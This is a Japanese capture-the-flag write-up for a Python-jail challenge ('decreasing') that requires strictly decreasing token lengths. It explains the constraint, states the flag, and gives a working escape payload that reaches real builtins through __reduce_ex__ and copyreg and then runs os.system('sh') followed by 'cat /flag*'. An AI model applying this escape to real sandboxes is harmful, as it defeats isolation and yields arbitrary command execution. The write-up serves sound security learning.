# [misc] decreasing

> `\w+` トークン長が狭義単調減少という制約下の pyjail。`__reduce_ex__` 経由で
> copyreg の本物の builtins を奪い、数字は記号だけで合成する。

## Overview

| Item | Value |
|------|-------|
| Platform | AlpacaHack |
| Event | Daily Challenge |
| Category | misc (pyjail) |
| Difficulty | ★★★★☆ (Hard 7.5) |
| Date | 2026-11-03 |
| Released | 2026-10-15 |
| Flag | `Alpaca{decrea5ing_is_e4si3r_than_incI2eas1ng}` |

## Problem Statement

```python
code = input("code> ")[:100]
if not code.isascii(): print("bye"); exit(1)
min_len = 100
for m in __import__("re").finditer(r"\w+", code):
    if len(m[0]) >= min_len: print("bye"); exit(1)
    min_len = len(m[0])
eval(code, {"__builtins__": {}})
```

- 100文字以内・ASCII のみ。
- `\w+`（英数字と `_` の連続）トークンの長さが、出現順に**狭義単調減少**であること。
- `__builtins__` は空。

SECCON CTF 14 Finals の "increasing" の派生。

## TL;DR

- 定番の脱出が両方封じられる:
  - `().__class__.__base__.__subclasses__()` → 長さ `9,8,14`（14で増加）✗
  - `(x for x in()).gi_frame.f_back…` → ジェネレータ式の `for`(3)/target/`in`(2) で崩れる ✗
- `[].__reduce_ex__(2)[0]` は `copyreg.__newobj__`（Python 製関数）。その `.__builtins__`
  は copyreg の**本物の builtins**（`re` を import 済みなので copyreg も読込済み）。
- 数字 `2` `0` は語になるので記号で合成: `-~([]==[])`=2, `[[]!=[]]`=index0。
- import 名 `os` は短すぎるので `'osXXXXXX'[:0x00002]` と長い語にしてスライス。
- トークン長 `13>12>10>8>7>6>2` で減少条件を満たす。

## Background Knowledge

### なぜ subclasses/frame が使えないか

減少条件は「全トークンが左から右へ厳密に短くなる」。object へ辿る dunder
(`__class__`=9, `__base__`=8, `__mro__`=7, `__bases__`=9) はすべて
`__subclasses__`(14) より短く、かつ必ずその前に出るため、`…,8,14` と増加して失格。
ジェネレータ式も `for`(3) と `in`(2) に挟まれた短いターゲット名が条件を壊す。

### `__reduce_ex__` → copyreg.__newobj__ → 本物の builtins

`[].__reduce_ex__(2)` は pickle プロトコル2用の情報を返し、その `[0]` が
`copyreg.__newobj__` 関数。Python 関数の `__builtins__` 属性はその関数が定義された
モジュール（copyreg）の builtins 辞書で、`__import__` を含む。`re` import により
copyreg は読込済みなので参照できる。参考: [Pyjail Cheatsheet | Shirajuki]。

### 記号だけで整数を作る

- `[]==[]` → `True`（1）。`-~True` → `2`（`~1 = -2`, 単項マイナスで `2`）。
- `[]!=[]` → `False`（0）。`[ []!=[] ]` → リストの index 0。
- `0x00002` は16進リテラルだが `\w+` としては長さ7の語になり、`'osXXXXXX'`(8) の次に
  置くことで減少を保ちつつ `[:2]` スライスに使える。

## Solution

ペイロード（98文字, ASCII, トークン長 13>12>10>8>7>6>2）:

```python
[].__reduce_ex__(-~([]==[]))[[]!=[]].__builtins__['__import__']('osXXXXXX'[:0x00002]).system('sh')
```

これで `os.system('sh')` によりソケット上にシェルが起動する。続けて標準入力に
`cat /flag*` を送ってフラグを読む（`'cat /flag*'` を直書きすると `cat`(3)→`flag`(4) が
増加して失格になるため、シェル経由にする）。実装は `solve.py`。

## Lessons Learned

- pyjail では「クラス階層」「フレーム」以外に **pickle 系関数 `__reduce_ex__` →
  関数の `__builtins__`** という王道の脱出口がある。
- トークン長や文字集合の制約は、整数を真偽値のビット演算（`-~([]==[])`）で作る、
  文字列をスライスで縮める、といった「記号で値を合成する」テクで回避できる。

## References

- 解法の学習に blackade 氏の writeup を参照:
  https://github.com/13lackade/ctf-writeups/blob/main/2026/daily-alpacahack/decreasing/README.md
- Pyjail Cheatsheet | Shirajuki: https://shirajuki.js.org/blog/pyjail-cheatsheet/
- 元ネタ: SECCON CTF 14 Finals "increasing"

## Tags

`misc` `pyjail` `reduce_ex` `copyreg` `builtins` `token-length` `symbolic-int`
